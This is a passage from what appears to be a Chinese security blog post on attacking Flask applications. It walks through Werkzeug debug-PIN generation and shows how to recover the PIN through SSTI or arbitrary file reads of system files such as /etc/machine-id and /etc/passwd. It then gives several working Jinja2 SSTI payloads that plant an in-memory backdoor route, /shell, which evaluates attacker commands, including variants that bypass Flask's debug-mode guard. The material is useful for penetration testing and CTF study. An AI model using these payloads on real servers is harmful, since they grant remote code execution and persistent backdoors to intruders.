class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> getpass<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> typing <span class="hljs-keyword">as</span> t<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> chain<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_machine_id</span>():<br>    <span class="hljs-comment"># --- linux 获取逻辑 ---</span><br>    linux = <span class="hljs-string">b&quot;&quot;</span><br><br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> <span class="hljs-string">&quot;/etc/machine-id&quot;</span>, <span class="hljs-string">&quot;/proc/sys/kernel/random/boot_id&quot;</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                value = f.readline().strip()<br>        <span class="hljs-keyword">except</span> OSError:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> value:<br>            linux += value<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-comment"># 如果是容器，下面的逻辑可以用于区分不同容器</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/proc/self/cgroup&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>            linux += f.readline().strip().rpartition(<span class="hljs-string">b&quot;/&quot;</span>)[<span class="hljs-number">2</span>]<br>    <span class="hljs-keyword">except</span> OSError:<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">if</span> linux:<br>        <span class="hljs-keyword">return</span> linux<br><br>    <span class="hljs-comment"># --- OS X 获取逻辑 ---</span><br>    <span class="hljs-comment"># 用 ioreg 去获取 machine guid</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># subprocess may not be available, e.g. Google App Engine</span><br>        <span class="hljs-comment"># https://github.com/pallets/werkzeug/issues/925</span><br>        <span class="hljs-keyword">from</span> subprocess <span class="hljs-keyword">import</span> Popen, PIPE<br><br>        dump = Popen(<br>            [<span class="hljs-string">&quot;ioreg&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, <span class="hljs-string">&quot;IOPlatformExpertDevice&quot;</span>, <span class="hljs-string">&quot;-d&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>], stdout=PIPE<br>        ).communicate()[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">b&#x27;&quot;serial-number&quot; = &lt;([^&gt;]+)&#x27;</span>, dump)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span> <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-keyword">except</span> (OSError, ImportError):<br>        <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-comment"># --- Windows 获取逻辑 ---</span><br>    <span class="hljs-comment"># 用 winreg 去获取 machine guid</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">import</span> winreg<br>    <span class="hljs-keyword">except</span> ImportError:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> winreg.OpenKey(<br>                winreg.HKEY_LOCAL_MACHINE,<br>                <span class="hljs-string">&quot;SOFTWARE\\Microsoft\\Cryptography&quot;</span>,<br>                <span class="hljs-number">0</span>,<br>                winreg.KEY_READ | winreg.KEY_WOW64_64KEY,<br>            ) <span class="hljs-keyword">as</span> rk:<br>                guid, guid_type = winreg.QueryValueEx(rk, <span class="hljs-string">&quot;MachineGuid&quot;</span>)<br><br>                <span class="hljs-keyword">if</span> guid_type == winreg.REG_SZ:<br>                    <span class="hljs-keyword">return</span> guid.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br>                <span class="hljs-keyword">return</span> guid<br><br>        <span class="hljs-keyword">except</span> OSError:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_pin_and_cookie_name</span>(<span class="hljs-params">app</span>):<br>    <span class="hljs-comment"># 环境变量里的 WERKZEUG_DEBUG_PIN</span><br>    pin = os.environ.get(<span class="hljs-string">&quot;WERKZEUG_DEBUG_PIN&quot;</span>)<br>    rv = <span class="hljs-literal">None</span><br>    num = <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> pin == <span class="hljs-string">&quot;off&quot;</span>:<br>        <span class="hljs-comment"># 此时无需填写 pin 即可使用 webshell</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">if</span> pin <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">and</span> pin.replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).isdigit():<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;-&quot;</span> <span class="hljs-keyword">in</span> pin:<br>            <span class="hljs-comment"># 此时 pin 码就是 WERKZEUG_DEBUG_PIN 的值</span><br>            rv = pin<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 后面 len(num) 会作为 pin 码的长度</span><br>            num = pin<br><br>    <span class="hljs-comment"># 参数 1：</span><br>    <span class="hljs-comment"># 由于 flask 传入的固定是 flask.Flask()</span><br>    <span class="hljs-comment"># 所以这里的 modname 就是 &quot;flask.app&quot;</span><br>    modname = <span class="hljs-built_in">getattr</span>(<br>        app,<br>        <span class="hljs-string">&quot;__module__&quot;</span>,<br>        t.cast(<span class="hljs-built_in">object</span>, app).__class__.__module__<br>    )<br><br>    <span class="hljs-comment"># 参数 2：</span><br>    <span class="hljs-comment"># 这里获取的是系统的用户名</span><br>    <span class="hljs-comment"># 其实就是执行 whoami</span><br>    <span class="hljs-keyword">try</span>:<br>        username = getpass.getuser()<br>    <span class="hljs-keyword">except</span> (ImportError, KeyError):<br>        <span class="hljs-comment"># 有些特殊的情况下，UID 无法唯一关联到一个用户</span><br>        <span class="hljs-comment"># 就会报错，次数 username 就是 None</span><br>        <span class="hljs-comment"># 相关 issue 可见：</span><br>        <span class="hljs-comment"># https://github.com/pallets/werkzeug/issues/1471</span><br>        username = <span class="hljs-literal">None</span><br><br>    mod = sys.modules.get(modname)<br>    probably_public_bits = [<br>        username,  <span class="hljs-comment"># `whoami`</span><br>        modname,  <span class="hljs-comment"># &quot;flask.app&quot;</span><br>        <span class="hljs-built_in">getattr</span>(app, <span class="hljs-string">&quot;__name__&quot;</span>, <span class="hljs-built_in">type</span>(app).__name__),  <span class="hljs-comment"># &quot;Flask&quot;</span><br><br>        <span class="hljs-comment"># 参数 3：</span><br>        <span class="hljs-comment"># 模块 modname 所在文件的完整系统路径</span><br>        <span class="hljs-comment"># 这里其实就是 app.py 所在的完整系统路径</span><br>        <span class="hljs-built_in">getattr</span>(mod, <span class="hljs-string">&quot;__file__&quot;</span>, <span class="hljs-literal">None</span>),<br>    ]<br><br>    <span class="hljs-comment"># 参数 4：</span><br>    <span class="hljs-comment"># 第一个值是服务器的 MAC 地址，它是一个 48 位正整数</span><br>    <span class="hljs-comment"># 第二个值是 get_machine_id()</span><br>    private_bits = [<span class="hljs-built_in">str</span>(uuid.getnode()), get_machine_id()]<br><br>    h = hashlib.sha1()<br>    <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> chain(probably_public_bits, private_bits):<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> bit:<br>            <span class="hljs-keyword">continue</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(bit, <span class="hljs-built_in">str</span>):<br>            bit = bit.encode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br>        h.update(bit)<br><br>    <span class="hljs-comment"># 参数 5：</span><br>    <span class="hljs-comment"># 固定值 cookiesalt</span><br>    h.update(<span class="hljs-string">b&quot;cookiesalt&quot;</span>)<br><br>    <span class="hljs-comment"># 这个我们用不到</span><br>    cookie_name = <span class="hljs-string">f&quot;__wzd<span class="hljs-subst">&#123;h.hexdigest()[:<span class="hljs-number">20</span>]&#125;</span>&quot;</span><br><br>    <span class="hljs-keyword">if</span> num <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># 固定值 pinsalt</span><br>        h.update(<span class="hljs-string">b&quot;pinsalt&quot;</span>)<br><br>        <span class="hljs-comment"># 这里长度永远是 9，一定是符合下面要求的长度</span><br>        num = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;<span class="hljs-built_in">int</span>(h.hexdigest(), <span class="hljs-number">16</span>):09d&#125;</span>&quot;</span>[:<span class="hljs-number">9</span>]<br><br>    <span class="hljs-keyword">if</span> rv <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        <span class="hljs-keyword">for</span> group_size <span class="hljs-keyword">in</span> <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(num) % group_size == <span class="hljs-number">0</span>:<br>                <span class="hljs-comment"># 将 num 拆解为 n 组，每组通过 &#x27;-&#x27; 连接</span><br>                <span class="hljs-comment"># n 必须为 [5, 4, 3] 的其中一个的倍数</span><br>                <span class="hljs-comment"># 否则认为 num 长度错误</span><br>                rv = <span class="hljs-string">&quot;-&quot;</span>.join(<br>                    num[x: x + group_size].rjust(group_size, <span class="hljs-string">&quot;0&quot;</span>)<br>                    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(num), group_size)<br>                )<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-comment"># 长度错误的 num 会被直接置为 pin 码</span><br>            <span class="hljs-comment"># 只会出现在自定义了 WERKZEUG_DEBUG_PIN 的时候</span><br>            rv = num<br><br>    <span class="hljs-keyword">return</span> rv, cookie_name<br></code></pre></td></tr></table></figure><p>所以一共有 9 个必要参数：</p><ol type="1"><li>环境变量 <code>WERKZEUG_DEBUG_PIN</code>：非常重要的值，它本身可能就是 PIN 码，以及决定了后面生成 PIN 的流程。不过这个值一般不会修改</li><li><code>probably_public_bits</code>，它是一个 4 元列表，其中包含：<ol type="1"><li><code>username</code>：运行 flask 所使用的的系统用户名</li><li><code>modname</code>：在 flask 中，此值固定是 <code>"flask.app"</code></li><li>固定值 <code>"Flask"</code></li><li><code>app.py</code> 所在的完整系统路径</li></ol></li><li><code>private_bits</code>，它是一个 2 元列表，其中包含：<ol type="1"><li>MAC 地址（48 位正整数格式）</li><li><code>Machine ID</code>：通常在系统安装或首次启动时从一个随机数源生成，并且之后不会自己发生变化；不同的操作系统获取的方式不同</li></ol></li><li>固定值 <code>"cookiesalt"</code></li><li>固定值 <code>"pinsalt"</code></li><li>将上面的结果进行 sha1，然后取前 9 位</li><li>每 3 位一组，用 <code>-</code> 连接</li></ol><p>如果有办法在目标环境中执行 Python 代码，那么获取 PIN 是很简单的，可以直接调用 <code>get_pin_and_cookie_name</code> 来生成即可：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">__import__</span>(<br>    <span class="hljs-string">&#x27;werkzeug.debug&#x27;</span>,<br>    fromlist=[<span class="hljs-string">&#x27;&#x27;</span>]<br>).get_pin_and_cookie_name(<br>    <span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;__main__&#x27;</span>).app<br>)<br></code></pre></td></tr></table></figure></p><p>例如通过 SSTI：</p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/59bbadda-e5d1-4fcf-b42d-6869f9858fb3.png!blog" /></p><p>如果存在任意文件读取漏洞，则需要拿到非固定的值，可以通过特殊文件来获取：</p><ol type="1"><li>环境变量 <code>WERKZEUG_DEBUG_PIN</code> 先无视</li><li><code>username</code> 通过 <code>/etc/passwd</code> 来猜测</li><li>app.py 的绝对路径在 debug 的报错中就有</li><li>在 Linux 环境中，Mac 地址可以读取 <code>/sys/class/net/网卡名称/address</code>，删除 <code>:</code> 之后转为 10 进制即可，网卡名可以通过 <code>/proc/net/dev</code> 文件来查找</li><li><code>Machine ID</code> 按照 <code>get_machine_id</code> 的逻辑来读取即可</li></ol><h3 id="内存马">内存马</h3><p>在文档中我们可以发现 <code>flask.Flask</code> 有一些特殊的方法，可以修改处理请求的逻辑。</p><h4 id="add_url_rule">add_url_rule</h4><p><code>add_url_rule</code> 是用来注册路由的。</p><p>根据官方文档，这三种写法是等价的：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment"># 写法 1</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    ...<br><br><br><span class="hljs-comment"># 写法 2</span><br>app.add_url_rule(<span class="hljs-string">&quot;/&quot;</span>, endpoint=<span class="hljs-string">&quot;index&quot;</span>)<br><span class="hljs-meta">@app.endpoint(<span class="hljs-params"><span class="hljs-string">&quot;index&quot;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    ...<br><br><br><span class="hljs-comment"># 写法 3</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    ...<br><br>app.add_url_rule(<span class="hljs-string">&quot;/&quot;</span>, view_func=index)<br></code></pre></td></tr></table></figure></p><p>这就意味着，如果变量 app 是可以控制的，那么我们可以通过 <code>app.add_url_rule("/shell", view_func=lambda: eval(request.args["cmd"]))</code> 来植入一个后门。</p><p>在绑定的时候有几个需要注意的地方：</p><ol type="1"><li>所有 url 所绑定的函数名称（即 endpoint）与函数的映射关系，可以通过 <code>app.view_functions</code> 看到</li><li>绑定的时候，会将对应的 endpoint 保存至 <code>app.view_functions</code>，如果这个时候 endpoint 已经存在，但是新绑定的过程中改变了对应的函数，就会报错，比如 lambda：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/79aab4ed-d595-47f7-b936-be456042888d.png!blog" /><br />因为 lambda 每次执行都会新生成一个对象，并不是固定的：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/9b46cbf3-439f-4f43-8aab-fe1f8a9219aa.png!blog#width-zoom4" /></li><li>为了避免上面那个问题，可以手动指定 endpoint 的名称：<code>app.add_url_rule("/shell", "ep-1", view_func=lambda x: x)</code><br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/60d521fe-2b71-4c5a-816b-8a6e6891c83a.png!blog" /></li><li>对于同一个 url，如果绑定了多次 endpoint，以第一次绑定的结果为准：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/00422668-1f0d-4814-bd95-264cbc56480b.png!blog" /><br />不过要修改也简单，可以通过 <code>app.view_functions</code> 修改<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/095c4a0c-92f2-4f68-ae0e-8dad90ff4f3f.png!blog" /></li><li>上面也给了我们启发，通过 <code>app.view_functions</code> 即可篡改 url 所绑定的函数。</li><li><code>app.url_map</code> 中保存了 url 与 endpoint 的对应关系。结合上面的结论大致可以推测出，<code>app.add_url_rule</code> 应该是依赖 <code>app.view_functions</code> 和 <code>app.url_map</code> 的。</li><li>debug 模式下，如果直接调用 setup function 是没有办法使用的：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/f7c723c3-adba-46f7-97ee-9faf6fd9d6ab.png!blog" /><br />代码位于 <code>site-packages/flask/scaffold.py</code> 中的 <code>def setupmethod</code> 下：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/6774680b-6b51-4b8d-af80-5c1e75ae8773.png!blog" /><br />而 <code>site-packages/flask/app.py</code> 中的 <code>class Flask</code> 继承了 <code>Scaffold</code> 且定义了 <code>_is_setup_finished</code>：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/5a6525b8-5f8f-41f5-870b-c7ba27aad4dc.png!blog" /><br />这就说明，当开启 debug 模式，且已经开始准备好开始处理客户端的请求，就没办法在执行 setup function 了。如果你想知道还有哪些算 setup function，在 <code>site-packages/flask/app.py</code> 中被装饰器 <code>@setupmethod</code> 装饰的都算。当然，由于这里是通过装饰器做的限制，所以理论上我们精简 setup function 之后或许也可以自己搞出与之等价的函数，这一点后面会举例。</li></ol><p>踩完坑之后，下面结合 jinja2 的 SSTI 举几个例子。</p><p>由于 jinja2 中并不支持用 <code>lambda</code>（通过 mro 引入也不行用，因为 jinja 的语法本身就不支持），而 <code>view_func</code> 参数又必须是一个 func，如果直接使用 <code>view_func=eval</code>，由于在 flask 不会给 <code>view_func</code> 传参，所以压根就没法执行。如果是固定执行一个命令倒是可以，就是有点不够灵活了。</p><p>为了实现类似 lambda 的效果，我们可以定义一个宏，然后植入后门：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% macro x() %&#125; cycler.__init__.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(request.args.cmd) &#123;% endmacro %&#125;<br>&#123;&#123; lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;__main__&quot;</span>).app.add_url_rule(<span class="hljs-string">&quot;/shell&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>, view_func=x) &#125;&#125;<br></code></pre></td></tr></table></figure></p><p>这里有坑需要注意下。</p><p>我在测试的过程中发现，<code>lipsum. ... .__import__("__main__").app.add_url_rule</code> 似乎会改变 <code>lipsum</code> 的上下文属性，导致在宏里无法引用到 <code>lipsum</code>。也就是说，这个 payload 是不行的：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;% macro x() %&#125; lipsum.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(request.args.cmd) &#123;% endmacro %&#125;<br>&#123;&#123; lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&quot;__main__&quot;</span>).app.add_url_rule(<span class="hljs-string">&quot;/shell&quot;</span>, <span class="hljs-string">&quot;x&quot;</span>, view_func=x) &#125;&#125;<br></code></pre></td></tr></table></figure></p><p>以及由于 <code>macro</code> 和普通函数不太一样，它是没有 <code>__name__</code> 的。所以必须指定一下 endpoint。</p><p>除了宏之外，还有办法搞一个自定义函数出来吗？如果可以使用 <code>def</code> 就好了。那么这个 <code>exec</code> 就可以实现。虽然 exec 返回值固定是 None，但是其实里面定义的函数在外边是可以使用的（<strong>通常情况</strong>）：<br /><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/ae46efd6-2569-4a79-8fa1-8ec65a4eb3ee.png!blog#width-zoom5" /></p><p>上面特别标注了 “通常情况”，为何呢？<code>eval</code>、<code>exec</code>、<code>compile</code> 都是非常有趣的内置函数，他们有非常多的特性，有机会我专门写一篇来介绍。</p><p>总之，我们可以这样：<code>eval('exec("def x(): return x")')</code></p><p>当然，<code>compile</code> 也是 ok 的，所以还可以这样：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;types&#x27;</span>).FunctionType(<br>  <span class="hljs-built_in">compile</span>(<br>    <span class="hljs-string">&#x27;def foo(): return &quot;bar&quot;&#x27;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span><br>  ).co_consts[<span class="hljs-number">0</span>],<br>  <span class="hljs-built_in">globals</span>()<br>)<br></code></pre></td></tr></table></figure><p>结合 jinja2 的 SSTI 就是这样了：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs py">lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>).app.add_url_rule(<br>  <span class="hljs-string">&quot;/shell&quot;</span>,<br>  view_func=lipsum.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(<br>    <span class="hljs-string">&#x27;exec(&quot;&#x27;</span><br>      <span class="hljs-string">&#x27;def x(): &#x27;</span><br>        <span class="hljs-string">&#x27;return str(eval(__import__(\\&quot;__main__\\&quot;).request.args[\\&quot;cmd\\&quot;]))&#x27;</span><br>    <span class="hljs-string">&#x27;&quot;), x&#x27;</span><br>  )[<span class="hljs-number">1</span>]<br>)<br></code></pre></td></tr></table></figure></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs py">lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>).app.add_url_rule(<br>  <span class="hljs-string">&quot;/shell&quot;</span>,<br>  view_func=lipsum.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(<br>    <span class="hljs-string">&#x27;__import__(&quot;types&quot;).FunctionType(compile(</span><br><span class="hljs-string">      &quot;def x(): &quot;</span><br><span class="hljs-string">        &quot;return str(eval(__import__(\\&quot;__main__\\&quot;).request.args[\\&quot;cmd\\&quot;]))&quot;, </span><br><span class="hljs-string">      &quot;&quot;,</span><br><span class="hljs-string">      &quot;exec&quot;</span><br><span class="hljs-string">    ).co_consts[0], globals())&#x27;</span><br>  )<br>)<br></code></pre></td></tr></table></figure><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/7ba8229a-b7ad-4161-a17d-b3c10b5a37ea.png!blog" /></p><h4 id="绕过-setup-function-debug-模式限制">绕过 setup function debug 模式限制</h4><p>正如上面说的那样，在 debug 模式下是没办法直接使用 setup function 的。好在有绕过的办法（下面均以 <code>add_url_rule</code> 为例）。</p><blockquote><p>修改属性</p></blockquote><p><code>_is_setup_finished</code> 中的限制，是实时获取属性来判断的。所以我们只需要修改 <code>app.deug = False</code> 或者 <code>app._got_first_request = False</code> 即可绕过。例如：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;&#123;<br>lipsum.__globals__.__builtins__.<span class="hljs-built_in">setattr</span>(<br>  lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>    <span class="hljs-string">&#x27;__main__&#x27;</span><br>  ).app,<br>  <span class="hljs-string">&quot;debug&quot;</span>,<br>  <span class="hljs-literal">False</span><br>), <br>lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>).app.add_url_rule(<br>  <span class="hljs-string">&quot;/shell&quot;</span>,<br>  view_func=lipsum.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(<br>    <span class="hljs-string">&#x27;exec(&quot;&#x27;</span><br>      <span class="hljs-string">&#x27;def x(): &#x27;</span><br>        <span class="hljs-string">&#x27;return str(eval(__import__(\\&quot;__main__\\&quot;).request.args[\\&quot;cmd\\&quot;]))&#x27;</span><br>    <span class="hljs-string">&#x27;&quot;), x&#x27;</span><br>  )[<span class="hljs-number">1</span>]<br>)<br>&#125;&#125;<br></code></pre></td></tr></table></figure><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/1f62e65b-b017-4e24-a3e4-4e3c33acdc5e.png!blog" /></p><blockquote><p>模拟 setup function</p></blockquote><p>在 <code>site-packages/flask/app.py</code> 中可以看到 <code>add_url_rule</code> 的逻辑似乎比较复杂。但实际上，它最主要的操作就两个：</p><ol type="1"><li><code>rule = self.url_rule_class(rule, methods=methods, **options)</code> &amp; <code>self.url_map.add(rule)</code></li><li><code>self.view_functions[endpoint] = view_func</code></li></ol><p>所以我们只需要执行：</p><ol type="1"><li><code>app.url_map.add(app.url_rule_class("/shell", methods=&#123;"GET"&#125;, endpoint="x"))</code>，就可以在 <code>/shell</code> 上注册一个叫 <code>x</code> 的 endpoint</li><li><code>app.view_functions["x"] = eval</code>，这样就完成了 endpoint 与函数的绑定</li></ol><p>还是以 SSTI 为例：<br /><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs py">&#123;&#123;<br>lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>).app.url_map.add(<br>  lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>    <span class="hljs-string">&#x27;__main__&#x27;</span><br>  ).app.url_rule_class(<br>    <span class="hljs-string">&quot;/shell&quot;</span>, methods=[<span class="hljs-string">&quot;GET&quot;</span>], endpoint=<span class="hljs-string">&quot;x&quot;</span><br>  )<br>),<br>lipsum.__globals__.__builtins__.<span class="hljs-built_in">__import__</span>(<br>  <span class="hljs-string">&#x27;__main__&#x27;</span><br>).app.view_functions.__setitem__(<br>  <span class="hljs-string">&quot;x&quot;</span>,<br>  lipsum.__globals__.__builtins__.<span class="hljs-built_in">eval</span>(<br>      <span class="hljs-string">&#x27;exec(&quot;&#x27;</span><br>        <span class="hljs-string">&#x27;def x(): &#x27;</span><br>          <span class="hljs-string">&#x27;return str(eval(__import__(\\&quot;__main__\\&quot;).request.args[\\&quot;cmd\\&quot;]))&#x27;</span><br>      <span class="hljs-string">&#x27;&quot;), x&#x27;</span><br>    )[<span class="hljs-number">1</span>]<br>)<br>&#125;&#125;<br></code></pre></td></tr></table></figure></p><p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-flask/e91f0ec0-5330-45c6-b2a6-1d0549ee38b9.png!blog" /></p><h4 id="其他-setup-function">其他 setup function</h4><p>像 <code>before_request_funcs</code>、<code>after_request</code>、<code>register_error_handler</code> 之类的应该都是可以用来搞内存马的。可能还有一些其他函数，有需要用的时候可以翻翻官方文档尝试一下。</p><h4 id="从文件写到-rce">从文件写到 RCE</h4><p>在《Python 